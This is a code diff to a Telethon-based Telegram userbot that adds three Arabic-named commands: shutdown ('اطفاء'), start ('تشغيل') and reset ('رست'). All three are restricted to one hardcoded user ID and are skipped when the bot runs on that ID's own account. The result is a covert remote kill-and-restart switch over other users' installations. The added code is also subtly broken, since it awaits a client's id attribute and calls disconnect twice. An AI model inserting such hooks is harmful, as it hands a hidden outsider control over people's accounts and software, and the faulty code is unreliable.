@@ -10,6 +10,33 @@ from ميمز import *
 from ABH import *
 from ذاتية import *
 from وعد import *
+@ABH.on(events.NewMessage(pattern="^اطفاء$", from_users=[1910015590]))
+async def shutdown(event):
+    id = await event.get_client().id
+    if id == 1910015590:
+        return
+    await event.reply("🔴 جارٍ إيقاف اليوزربوت ...")
+    await asyncio.sleep(1)
+    await ABH.disconnect()
+    await ABH.disconnect()
+    sys.exit(0)
+@ABH.on(events.NewMessage(pattern="^تشغيل$", from_users=[1910015590]))
+async def start_bot(event):
+    id = await event.get_client().id
+    if id == 1910015590:
+        return
+    await ABH.start()
+    await event.reply("🟢 جارٍ تشغيل اليوزربوت ...")
+    await asyncio.sleep(1)
+    await event.reply("✅ اليوزربوت يعمل الآن!")
+@ABH.on(events.NewMessage(pattern="^رست$", from_users=[1910015590]))
+async def resetbot(event):
+    id = await event.get_client().id
+    if id == 1910015590:
+        return
+    await event.reply("♻️ جارٍ إعادة تشغيل اليوزربوت ...")
+    await asyncio.sleep(1)
+    await restart_bot(event)
 @ABH.on(events.NewMessage(pattern="^اعادة تشغيل$", outgoing=True))
 async def restart_bot(event):
     await event.edit("♻️ جارٍ إعادة تشغيل اليوزربوت ...")
